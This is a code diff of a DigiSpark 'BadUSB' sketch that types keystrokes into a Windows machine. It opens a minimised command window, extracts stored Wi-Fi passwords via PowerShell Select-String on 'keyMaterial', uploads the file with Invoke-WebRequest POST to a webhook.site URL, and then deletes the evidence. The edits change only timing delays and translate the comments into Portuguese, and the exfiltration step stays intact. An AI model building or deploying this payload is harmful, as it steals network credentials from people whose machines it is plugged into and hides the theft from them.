@@ -13,9 +13,9 @@ void loop() {
   DigiKeyboard.delay(3000);
  
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(800);
+  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //aqui abrirá a janela do cmd de formato pequeno (pequeno apenas no WIN10)
+  DigiKeyboard.delay(1300);
   DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
   DigiKeyboard.delay(100);
   DigiKeyboard.println("cd %temp%"); //going to temporary dir
@@ -24,7 +24,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/25220c3c-746b-4d31-beda-b021911b1b56 -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
+  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/25220c3c-746b-4d31-beda-b021911b1b56 -Method POST -InFile Wi-Fi-PASS"); //Insira a URI do seu webhook
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
   DigiKeyboard.delay(100);
